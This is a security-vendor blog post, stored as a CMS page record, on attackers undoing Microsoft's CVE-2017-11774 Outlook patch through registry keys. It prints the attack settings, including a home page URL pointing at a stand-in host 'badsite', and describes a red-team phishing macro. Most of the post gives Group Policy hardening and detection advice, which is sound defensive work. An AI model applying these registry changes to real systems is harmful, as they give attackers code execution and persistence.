{
  "jcr:primaryType": "cq:Page",
  "jcr:createdBy": "fireeye_global_admin",
  "jcr:created": "Wed Dec 04 2019 10:01:36 GMT+0000",
  "jcr:content": {
    "jcr:primaryType": "cq:PageContent",
    "jcr:mixinTypes": [
      "mix:versionable"
    ],
    "jcr:createdBy": "fireeye_global_admin",
    "jcr:title": "Breaking the Rules: A Tough Outlook for Home Page Attacks (CVE-2017-11774)",
    "jcr:versionHistory": "7e25818f-717a-4ba6-a89c-84aca1c3032a",
    "author": "Matthew McWhirt",
    "cq:template": "\/apps\/fireeye-blog\/templates\/page_blogpost",
    "jcr:language": "en_us",
    "jcr:predecessors": [
      "41dc735b-62d4-45bd-8258-e7201686dcb5"
    ],
    "jcr:created": "Wed Dec 04 2019 18:05:27 GMT+0000",
    "cq:lastModified": "Wed Dec 04 2019 18:05:18 GMT+0000",
    "jcr:baseVersion": "41dc735b-62d4-45bd-8258-e7201686dcb5",
    "jcr:isCheckedOut": true,
    "cq:tags": [
      "fireeye-blog-authors:matthew-mcwhirt",
      "fireeye-blog-authors:nick-carr",
      "fireeye-blog-authors:douglas-bienstock",
      "fireeye-blog-threat-research:threat-research",
      "fireeye-blog-tags:email",
      "fireeye-blog-tags:homepage-carousel",
      "fireeye-blog-tags:latest",
      "fireeye-blog-tags:vulnerabilities",
      "fireeye-blog-tags:patches",
      "fireeye-blog-tags:outlook"
    ],
    "jcr:uuid": "bb97d879-d295-4cda-a5ca-aeb8e0c085ac",
    "sling:resourceType": "social\/blog\/components\/page",
    "published": "Wed Dec 04 2019 05:00:00 GMT-0500",
    "cq:lastModifiedBy": "adam.greenberg@fireeye.com",
    "par": {
      "jcr:primaryType": "nt:unstructured",
      "sling:resourceType": "foundation\/components\/parsys",
      "entry": {
        "jcr:primaryType": "nt:unstructured",
        "jcr:lastModifiedBy": "adam.greenberg@fireeye.com",
        "text": "\u003Cp\u003EAttackers have a dirty little secret that is being used to conduct big intrusions. We’ll explain how they\u0027re \u0026quot;unpatching\u0026quot; an exploit and then provide new Outlook hardening guidance that is not available elsewhere. Specifically, this blog post covers field-tested automated registry processing for registry keys to protect against attacker attempts to reverse Microsoft’s \u003Ca href=\u0022https:\/\/portal.msrc.microsoft.com\/en-US\/security-guidance\/advisory\/CVE-2017-11774\u0022\u003ECVE-2017-11774\u003C\/a\u003E patch functionality.\u003C\/p\u003E\n\u003Cp\u003EDespite \u003Ca href=\u0022https:\/\/www.fireeye.com\/blog\/threat-research\/2018\/12\/overruled-containing-a-potentially-destructive-adversary.html\u0022\u003Emultiple\u003C\/a\u003E \u003Ca href=\u0022https:\/\/twitter.com\/ItsReallyNick\/status\/1014522001900306433\u0022\u003Ewarnings\u003C\/a\u003E \u003Ca href=\u0022https:\/\/summit.fireeye.com\/content\/dam\/fireeye-www\/summit\/cds-2018\/presentations\/cds18-technical-s03-youve-got-mail.pdf\u0022\u003Efrom FireEye\u003C\/a\u003E and \u003Ca href=\u0022https:\/\/twitter.com\/CNMF_VirusAlert\/status\/1146130046127681536\u0022\u003EU.S. Cyber Command\u003C\/a\u003E, we have continued to observe an uptick in successful exploitation of CVE-2017-11774, a client-side Outlook attack that involves modifying victims’ Outlook client homepages for code execution and persistence. The Outlook Home Page feature allows for customization of the default view for any folder in Outlook. This configuration can allow for a specific URL to be loaded and displayed whenever a folder is opened. This URL is retrieved either via HTTP or HTTPS - and can reference either an internal or external network location. When Outlook loads the remote URL, it will render the contents using the Windows DLL \u003Ci\u003Eieframe.dll\u003C\/i\u003E, which can allow an attacker to achieve remote code execution that persists through system restarts.\u003C\/p\u003E\n\u003Cp\u003EWe have observed multiple threat actors adopting the technique and eventually becoming a favorite for Iranian groups in support of both espionage and reportedly destructive attacks. FireEye first observed APT34 use CVE-2017-11774 in June 2018, followed by adoption by APT33 for a significantly broader campaign beginning in July 2018 and continuing for at least a year. To further increase awareness of this intrusion vector, our \u003Ca href=\u0022https:\/\/twitter.com\/ItsReallyNick\/status\/1123285710491070464\u0022\u003EAdvanced Practices team worked with MITRE\u003C\/a\u003E to \u003Ca href=\u0022https:\/\/attack.mitre.org\/resources\/updates\/updates-april-2019\/index.html\u0022\u003Eupdate the ATT\u0026amp;CK framework\u003C\/a\u003E to include CVE-2017-11774 home page persistence within \u003Ca href=\u0022https:\/\/attack.mitre.org\/techniques\/T1137\/\u0022\u003Etechnique T1137 – “Office Application Startup”\u003C\/a\u003E.\u003C\/p\u003E\n\u003Cp\u003EFor more information on how CVE-2017-11774 exploitation works, how APT33 implemented it alongside password spraying, and some common pitfalls for incident responders analyzing this home page technique, see the “RULER In-The-Wild” section of \u003Ca href=\u0022https:\/\/www.fireeye.com\/blog\/threat-research\/2018\/12\/overruled-containing-a-potentially-destructive-adversary.html\u0022\u003Eour December 2018 OVERRULED blog post\u003C\/a\u003E.\u003C\/p\u003E\n\u003Ch4\u003EGoing Through a Rough Patch\u003C\/h4\u003E\n\u003Cp\u003EOn October 10, 2017, \u003Ca href=\u0022https:\/\/support.microsoft.com\/en-us\/help\/4011162\/description-of-the-security-update-for-outlook-2016-october-10-2017\u0022\u003EMicrosoft released patches\u003C\/a\u003E for Microsoft Outlook to protect against this technique.\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003EKB4011196 (Outlook 2010)\u003C\/li\u003E\n\u003Cli\u003EKB4011178 (Outlook 2013)\u003C\/li\u003E\n\u003Cli\u003EKB4011162 (Outlook 2016)\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EFollowing the mid-2018 abuse by Iranian threat actors \u003Ca href=\u0022https:\/\/www.fireeye.com\/blog\/threat-research\/2018\/12\/overruled-containing-a-potentially-destructive-adversary.html\u0022\u003Efirst detailed in our OVERRULED blog post\u003C\/a\u003E, the FireEye Mandiant team began to raise awareness of how the patch could be subverted. \u003Ca href=\u0022https:\/\/www.fireeye.com\/blog\/threat-research.html\/category\/etc\/tags\/fireeye-blog-authors\/douglas-bienstock\u0022\u003EDoug Bienstock\u003C\/a\u003E discussed in December 2018 that the simple roll back of the patch as a part of \u003Ca href=\u0022https:\/\/www.fireeye.com\/services\/red-team-assessments.html\u0022\u003EMandiant’s Red Team\u003C\/a\u003E operations – \u003Ca href=\u0022https:\/\/twitter.com\/doughsec\/status\/1076222018369081345\u0022\u003Eand alluded to observing authorized software that also automatically removes the patch functionality\u003C\/a\u003E. In response to U.S. Cyber Command’s mid-2019 warning about APT33’s use of the exploit, we \u003Ca href=\u0022https:\/\/www.darkreading.com\/us-military-warns-companies-to-look-out-for-iranian-outlook-exploits\/d\/d-id\/1335150\u0022\u003Eraised concern with DarkReading\u003C\/a\u003E over the ability to override the CVE-2017-11774 patch without escalated privileges.\u003C\/p\u003E\n\u003Cp\u003EWithout continuous reinforcement of the recommended registry settings for CVE-2017-11774 hardening detailed within this blog post, an attacker can add or revert registry keys for settings that essentially disable the protections provided by the patches.\u003C\/p\u003E\n\u003Cp\u003EAn attacker can set a home page to achieve code execution and persistence by editing the WebView registry keys. The “URL” subkey will enable and set a home page for the specified mail folder within the default mailbox. Setting this registry key to a valid URL enables the home page regardless of the patch being applied or not. Although the option will not be accessible from the Outlook user interface (UI), it will still be set and render. Importantly, these keys are set within the logged-on user’s Registry hive. This means that no special privileges are required to edit the Registry and roll back the patch. The FireEye Red Team found that no other registry modifications were required to set a malicious Outlook homepage.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cspan class=\u0022code\u0022\u003EHKEY_CURRENT_USER\\Software\\Microsoft\\Office\\\u0026lt;Outlook Version\u0026gt;\\ Outlook\\WebView\\Inbox\u003Cbr\u003E\n \u003C\/span\u003E\u003Cspan style=\u0022background-color: rgb(255, 255, 255); font-family: \u0026quot;Courier New\u0026quot;, Courier, monospace;\u0022\u003E“URL”= http:\/\/badsite\/homepage-persist.html\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003EThere are additional keys within the Registry that can be modified to further roll back the patch and expose unsafe options in Outlook. The following setting can be used to re-enable the original home page tab and roaming home page behavior in the Outlook UI.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cspan class=\u0022code\u0022\u003EHKEY_CURRENT_USER\\Software\\Microsoft\\Office\\\u0026lt;Outlook Version\u0026gt;\\Outlook\\Security\u003Cbr\u003E\n \u003C\/span\u003E\u003Cspan style=\u0022background-color: rgb(255, 255, 255); font-family: \u0026quot;Courier New\u0026quot;, Courier, monospace;\u0022\u003E“EnableRoamingFolderHomepages”= dword:00000001\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003EThe following setting will allow for folders within secondary (non-default) mailboxes to leverage a custom home page.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cspan class=\u0022code\u0022\u003EHKEY_CURRENT_USER\\Software\\Microsoft\\Office\\\u0026lt;Outlook Version\u0026gt;\\Outlook\\Security\u003Cbr\u003E\n \u003C\/span\u003E\u003Cspan style=\u0022background-color: rgb(255, 255, 255); font-family: \u0026quot;Courier New\u0026quot;, Courier, monospace;\u0022\u003E“NonDefaultStoreScript\u0026quot;= dword:00000001\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003EThe following setting will allow for “Run as a Script” and “Start Application” rules to be re-enabled.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cspan class=\u0022code\u0022\u003EHKEY_CURRENT_USER\\Software\\Microsoft\\Office\\\u0026lt;Outlook Version\u0026gt;\\Outlook\\Security\u003Cbr\u003E\n “EnableUnsafeClientMailRules\u0026quot;= dword:00000001\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003EEtienne Stalmans, a developer of \u003Ca href=\u0022https:\/\/github.com\/sensepost\/ruler\u0022\u003ESensePost’s RULER\u003C\/a\u003E and the credited responsible discloser of CVE-2017-11774,\u0026nbsp;\u003Ca href=\u0022https:\/\/twitter.com\/_staaldraad\/status\/1082604336574808065\u0022\u003Echimed in\u003C\/a\u003E about similar concerns on the patch that were re-raised after seeing a \u003Ca href=\u0022https:\/\/medium.com\/@bwtech789\/outlook-today-homepage-persistence-33ea9b505943\u0022\u003ESeptember 2018 blog post about applying the same technique to Outlook Today’s home page\u003C\/a\u003E that is stored at \u003Cspan class=\u0022code\u0022\u003EHKCU\\Software\\Microsoft\\Office\\\u0026lt;Outlook Version\u0026gt;\\Outlook\\Today\\UserDefinedUrl\u003C\/span\u003E. Both Etienne and the September 2018 blog post’s author describe what Microsoft has suggested as a key mitigating factor – that the exploit and rolling back the patch require some form of initial access. This is consistent with Microsoft’s position and \u003Ca href=\u0022https:\/\/blogs.technet.microsoft.com\/seanearp\/2007\/03\/25\/immutable-laws-of-security\/\u0022\u003Etheir 2007 immutable laws of security blog\u003C\/a\u003E, which were reiterated when we contacted MSRC prior to publishing this blog post.\u003C\/p\u003E\n\u003Cp\u003EWe agree that for the CVE-2017-11774 patch override vector to be successful, a bad guy has to persuade you to run his program (law #1) and alter your operating system (law #2). However, the technique is under-reported, no public mitigation guidance is available, and – as a fresh in-the-wild example demonstrates in this post – that initial access and patch overriding can be completely automated.\u003C\/p\u003E\n\u003Ch4\u003EA Cavalier Handling of CVE-2017-11774\u003C\/h4\u003E\n\u003Cp\u003EThe \u003Ca href=\u0022https:\/\/twitter.com\/ItsReallyNick\/lists\/fireeye-apt\u0022\u003EAdvanced Practices team\u003C\/a\u003E monitors for novel implementations of attacker techniques including this patch override, and on November 23, 2019 a uniquely automated phishing document was uploaded to VirusTotal. The sample, “TARA Pipeline.xlsm” (MD5: ddbc153e4e63f7b8b6f7aa10a8fad514), launches malicious Excel macros combining several techniques, including:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003Eexecution guardrails to only launch on the victim domain (client redacted in screenshot)\u003C\/li\u003E\n\u003Cli\u003Ecustom pipe-delimited character substitution obfuscation\u003C\/li\u003E\n\u003Cli\u003Ea creative implementation of CVE-2017-11774 using the lesser-known HKCU\\Software\\Microsoft\\Office\\\u0026lt;Outlook Version\u0026gt;\\Outlook\\WebView\\Calendar\\URL registry key\u003C\/li\u003E\n\u003Cli\u003Ea URL pointing to the payload \u003Ca href=\u0022https:\/\/docs.microsoft.com\/en-us\/azure\/storage\/blobs\/storage-blob-static-website\u0022\u003Ehosted in Azure storage blobs\u003C\/a\u003E (*.web.core.windows.net) – a creative technique that allows an attacker-controlled, swappable payload to be hosted in a legitimate service\u003C\/li\u003E\n\u003Cli\u003Eand most importantly for this blog post – a function to walk through the registry and reverse the CVE-2017-11774 patch functionality for any version of Microsoft Outlook\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003EThese features of the malicious spear phishing Excel macro can be seen in Figure 1.\u003C\/p\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/breakingtherules\/Picture1a.png\u0022 alt=\u0022\u0022\u003E\u003Cspan class=\u0022type-XS\u0022\u003E\u003Cbr\u003E\nFigure 1: Malicious macros automatically reverting the CVE-2017-11774 patch\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EPay special attention to the forced setting of EnableRoamingFolderHomepages to “1” and the setup of “\u003Cspan class=\u0022code\u0022\u003ECalendar\\URL\u003C\/span\u003E” key to point to an attacker-controlled payload, effectively disabling the CVE-2017-11774 patch on initial infection.\u003C\/p\u003E\n\u003Cp\u003EIn support of Managed Defense, \u003Ca href=\u0022https:\/\/www.fireeye.com\/blog\/threat-research\/2019\/03\/clustering-and-associating-attacker-activity-at-scale.html\u0022\u003Eour Advanced Practices team clusters and tactically attributes targeted threat activity\u003C\/a\u003E – whether the intrusion operators turn out to be authorized or unauthorized – in order to prioritize and deconflict intrusions. In this case, Nick Carr attributed this sample to an uncategorized cluster of activity associated with authorized red teaming, UNC1194 , but you might know them better as the \u003Ca href=\u0022https:\/\/twitter.com\/TrustedSec\u0022\u003ETrustedSec\u003C\/a\u003E red team whose founder, \u003Ca href=\u0022https:\/\/www.youtube.com\/watch?v=eaTBHWtDaF0\u0022\u003EDave Kennedy, appeared on a previous episode of State of the Hack\u003C\/a\u003E. This malicious Excel file appears to be a weaponized version of a legitimate victim-created document that we also obtained – reflecting a technique becoming more common with both authorized and unauthorized intrusion operators. For further analysis and screenshots of UNC1194’s next stage CVE-2017-11774 payload for initial reconnaissance, target logging visibility checks, and domain-fronted Azure command and control – \u003Ca href=\u0022https:\/\/twitter.com\/ItsReallyNick\/status\/1199209513137688576\u0022\u003Esee here\u003C\/a\u003E. Readers should take note that the automated patch removal and home page exploitation establishes attacker-controlled remote code execution and allows these [thankfully authorized] attackers to conduct a full intrusion by swapping out their payload remotely for all follow-on activity.\u003C\/p\u003E\n\u003Ch4\u003ELocking Down the Registry Keys Using Group Policy Object (GPO) Enforcement\u003C\/h4\u003E\n\u003Cp\u003EAs established, the patches for CVE-2017-11774 can be effectively “disabled” by modifying registry keys on an endpoint with no special privileges. The following registry keys and values should be configured via Group Policy to reinforce the recommended configurations in the event that an attacker attempts to reverse the intended security configuration on an endpoint to allow for Outlook home page persistence for malicious purposes.\u003C\/p\u003E\n\u003Cp\u003ETo protect against an attacker using Outlook’s WebView functionality to configure home page persistence, the following registry key configuration should be enforced.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cspan class=\u0022code\u0022\u003EHKEY_CURRENT_USER\\Software\\Microsoft\\Office\\\u0026lt;Outlook Version\u0026gt;\\Outlook\\WebView\u003Cbr\u003E\n \u003C\/span\u003E\u003Cspan style=\u0022background-color: rgb(255, 255, 255); font-family: \u0026quot;Courier New\u0026quot;, Courier, monospace;\u0022\u003E\u0026quot;Disable\u0026quot;= dword:00000001\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003ENote: Prior to enforcing this hardening method for all endpoints, the previous setting should be tested on a sampling of endpoints to ensure compatibility with third-party applications that may leverage webviews.\u003C\/p\u003E\n\u003Cp\u003ETo enforce the expected hardened configuration of the registry key using a GPO, the following setting can be configured.\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003EUser Configuration \u0026gt; Preferences \u0026gt; Windows Settings \u0026gt; Registry\u003Cul\u003E\n\u003Cli\u003ENew \u0026gt; Registry Item\u003Cul\u003E\n\u003Cli\u003EAction: Update\u003C\/li\u003E\n\u003Cli\u003EHive: HKEY_CURRENT_USER\u003C\/li\u003E\n\u003Cli\u003EKey Path: Software\\Microsoft\\Office\\\u0026lt;Outlook Version\u0026gt;\\Outlook\\Webview\u003Cul\u003E\n\u003Cli\u003EValue Name: Disable\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003Cli\u003EValue Type: REG_DWORD\u003C\/li\u003E\n\u003Cli\u003EValue Data: 00000001\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/breakingtherules\/Picture2.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 2: Disabling WebView registry setting\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EIncluded within the \u003Ca href=\u0022https:\/\/www.microsoft.com\/en-us\/download\/details.aspx?id=49030)\u0022\u003EMicrosoft Office Administrative Templates\u003C\/a\u003E, a GPO setting is available which can be configured to disable a home page URL from being set in folder properties for all default folders, or for each folder individually.\u0026nbsp; If set to “Enabled”, the following GPO setting essentially enforces the same registry configuration (disabling WebView) as previously noted.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cspan class=\u0022code\u0022\u003EUser Configuration \u0026gt; Policies \u0026gt; Administrative Templates \u0026gt; Microsoft Outlook \u0026lt;version\u0026gt; \u0026gt; Folder Home Pages for Outlook Special Folders \u0026gt; Do not allow Home Page URL to be set in folder Properties\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003EThe registry key configuration to disable setting an Outlook home page via the Outlook UI is as follows.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cspan class=\u0022code\u0022\u003EHKEY_CURRENT_USER\\Software\\Microsoft\\Office\\\u0026lt;Outlook Version\u0026gt;\\Outlook\\Security\u003Cbr\u003E\n \u003C\/span\u003E\u003Cspan style=\u0022background-color: rgb(255, 255, 255); font-family: \u0026quot;Courier New\u0026quot;, Courier, monospace;\u0022\u003E\u0026quot;EnableRoamingFolderHomepages\u0026quot;= dword:00000000\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003ETo enforce the expected hardened configuration of the registry key using a GPO, the following setting can be configured.\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003EUser Configuration \u0026gt; Preferences \u0026gt; Windows Settings \u0026gt; Registry\u003Cul\u003E\n\u003Cli\u003ENew \u0026gt; Registry Item\u003Cul\u003E\n\u003Cli\u003EAction: Update\u003C\/li\u003E\n\u003Cli\u003EHive: HKEY_CURRENT_USER\u003C\/li\u003E\n\u003Cli\u003EKey Path: Software\\Microsoft\\Office\\\u0026lt;Outlook Version\u0026gt;\\Outlook\\Security\u003Cul\u003E\n\u003Cli\u003EValue Name: EnableRoamingFolderHomepages\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003Cli\u003EValue Type: REG_DWORD\u003C\/li\u003E\n\u003Cli\u003EValue Data: 00000000\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/breakingtherules\/Picture3.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 3: EnableRoamingFolderHomepages registry setting\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EAdditionally, a home page in Outlook can be configured for folders in a non-default datastore. This functionality is disabled once the patch has been installed, but it can be re-enabled by an attacker.\u0026nbsp;Just like this blog post’s illustration of several different home page URL registry keys abused in-the-wild – including the Outlook Today setting from September 2018 and the Calendar URL setting from UNC1194’s November 2019 malicious macros – these non-default mailstores provide additional CVE-2017-11774 attack surface.\u003C\/p\u003E\n\u003Cp\u003EThe registry key configuration to enforce the recommended registry configuration is as follows.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cspan class=\u0022code\u0022\u003EHKEY_CURRENT_USER\\Software\\Microsoft\\Office\\\u0026lt;Outlook Version\u0026gt;\\Outlook\\Security\u003Cbr\u003E\n \u003C\/span\u003E\u003Cspan style=\u0022background-color: rgb(255, 255, 255); font-family: \u0026quot;Courier New\u0026quot;, Courier, monospace;\u0022\u003E\u0026quot;NonDefaultStoreScript\u0026quot;= dword:00000000\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003ETo enforce the expected hardened configuration of the registry key for non-default mailstores using a GPO, the following setting can be configured.\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003EUser Configuration \u0026gt; Preferences \u0026gt; Windows Settings \u0026gt; Registry\u003Cul\u003E\n\u003Cli\u003ENew \u0026gt; Registry Item\u003Cul\u003E\n\u003Cli\u003EAction: Update\u003C\/li\u003E\n\u003Cli\u003EHive: HKEY_CURRENT_USER\u003C\/li\u003E\n\u003Cli\u003EKey Path: Software\\Microsoft\\Office\\\u0026lt;Outlook Version\u0026gt;\\Outlook\\Security\u003Cul\u003E\n\u003Cli\u003EValue Name: NonDefaultStoreScript\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003Cli\u003EValue Type: REG_DWORD\u003C\/li\u003E\n\u003Cli\u003EValue Data: 00000000\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/breakingtherules\/Picture4.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 4: NonDefaultStoreScript registry setting\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EIncluded within the previously referenced Microsoft Office Administrative Templates, a GPO setting is available which can be configured to not allow folders in non-default stores to be set as folder home pages.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cspan class=\u0022code\u0022\u003EUser Configuration \u0026gt; Policies \u0026gt; Administrative Templates \u0026gt; Microsoft Outlook \u0026lt;version\u0026gt; \u0026gt; Outlook Options \u0026gt; Other \u0026gt; Advanced \u0026gt; Do not allow folders in non-default stores to be set as folder home pages\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003EWhile you’re locking things down, we thought that readers would also want to ensure they are locked down against RULER’s other modules for \u003Ca href=\u0022https:\/\/sensepost.com\/blog\/2016\/mapi-over-http-and-mailrule-pwnage\/\u0022\u003Erules-based persistence\u003C\/a\u003E and \u003Ca href=\u0022https:\/\/sensepost.com\/blog\/2017\/outlook-forms-and-shells\/\u0022\u003Eforms-based persistence\u003C\/a\u003E. This last recommendation ensures that the rule types \u003Ca href=\u0022https:\/\/github.com\/sensepost\/ruler\/issues\/35#issuecomment-299695731\u0022\u003Erequired by the other RULER modules\u003C\/a\u003E are no longer permissible on an endpoint. While not CVE-2017-11774, this is closely related and this last setting is consistent with \u003Ca href=\u0022https:\/\/blogs.technet.microsoft.com\/office365security\/defending-against-rules-and-forms-injection\/\u0022\u003EMicrosoft’s prior guidance\u003C\/a\u003E on rules and forms persistence.\u003C\/p\u003E\n\u003Cp\u003EThe registry key configuration to protect against an attacker re-enabling “Run as a Script” and “Start Application” rules is as follows.\u003C\/p\u003E\n\u003Ctable cellpadding=\u00221\u0022 cellspacing=\u00220\u0022 border=\u00221\u0022\u003E\n\u003Ctbody\u003E\u003Ctr\u003E\u003Ctd\u003E\u003Cspan class=\u0022code\u0022\u003EHKEY_CURRENT_USER\\Software\\Microsoft\\Office\\\u0026lt;Outlook Version\u0026gt;\\Outlook\\Security\\\u003Cbr\u003E\n \u003C\/span\u003E\u003Cspan style=\u0022background-color: rgb(255, 255, 255); font-family: \u0026quot;Courier New\u0026quot;, Courier, monospace;\u0022\u003E\u0026quot;EnableUnsafeClientMailRules\u0026quot;= dword:00000000\u003C\/span\u003E\u003C\/td\u003E\n\u003C\/tr\u003E\u003C\/tbody\u003E\u003C\/table\u003E\n\u003Cp\u003ETo enforce the expected hardened configuration of the registry key using a GPO, the following setting can be configured.\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003EUser Configuration \u0026gt; Preferences \u0026gt; Windows Settings \u0026gt; Registry\u003Cul\u003E\n\u003Cli\u003ENew \u0026gt; Registry Item\u003Cul\u003E\n\u003Cli\u003EAction: Update\u003C\/li\u003E\n\u003Cli\u003EHive: HKEY_CURRENT_USER\u003C\/li\u003E\n\u003Cli\u003EKey Path: Software\\Microsoft\\Office\\\u0026lt;Outlook Version\u0026gt;\\Outlook\\Security\u003Cul\u003E\n\u003Cli\u003EValue Name: EnableUnsafeClientMailRules\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003Cli\u003EValue Type: REG_DWORD\u003C\/li\u003E\n\u003Cli\u003EValue Data: 00000000\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/breakingtherules\/Picture5.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 5: EnableUnsafeClientMailRules registry setting\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EOnce all of aforementioned endpoint policies are configured – we recommend a final step to protect these settings from unauthorized tampering. To ensure that the registry settings (configured via GPO) are continuously assessed and applied to an endpoint – even if the registry value was intentionally reversed by an attacker – the following GPO settings should also be configured and enforced:\u003C\/p\u003E\n\u003Cul\u003E\n\u003Cli\u003EComputer Configuration \u0026gt; Policies \u0026gt; Administrative Templates \u0026gt; System \u0026gt; Group Policy \u0026gt; Configure security policy processing\u003Cul\u003E\n\u003Cli\u003EEnabled - Process even if the Group Policy objects have not changed\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003Cli\u003EComputer Configuration \u0026gt; Policies \u0026gt; Administrative Templates \u0026gt; System \u0026gt; Group Policy \u0026gt; Configure registry policy processing\u003Cul\u003E\n\u003Cli\u003EEnabled - Process even if the Group Policy objects have not changed\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003C\/li\u003E\n\u003C\/ul\u003E\n\u003Cp\u003E\u003Cimg src=\u0022\/content\/dam\/fireeye-www\/blog\/images\/breakingtherules\/Picture6.png\u0022 alt=\u0022\u0022\u003E\u003Cbr\u003E\n\u003Cspan class=\u0022type-XS\u0022\u003EFigure 6: Group Policy processing settings\u003C\/span\u003E\u003C\/p\u003E\n\u003Cp\u003EFor more environment hardening advice informed by front-line incident response, reach out to our \u003Ca href=\u0022https:\/\/www.fireeye.com\/services.html\u0022\u003EMandiant Security Transformation Services consulting team\u003C\/a\u003E.\u003C\/p\u003E\n\u003Ch4\u003ELet’s Go Hunt (doo doo doo)\u003C\/h4\u003E\n\u003Cp\u003EWith this blog post, we’re providing an IOC for monitoring CVE-2017-11774 registry tampering – while written for FireEye Endpoint Security (HX) in the \u003Ca href=\u0022https:\/\/github.com\/mandiant\/OpenIOC_1.1\u0022\u003EOpenIOC 1.1 schema\u003C\/a\u003E, this is a flexible behavioral detection standard that supports real-time and historical events and the logic can be repurposed for other endpoint products.\u003C\/p\u003E\n\u003Cp\u003EThe Yara hunting rule provided by Nick Carr 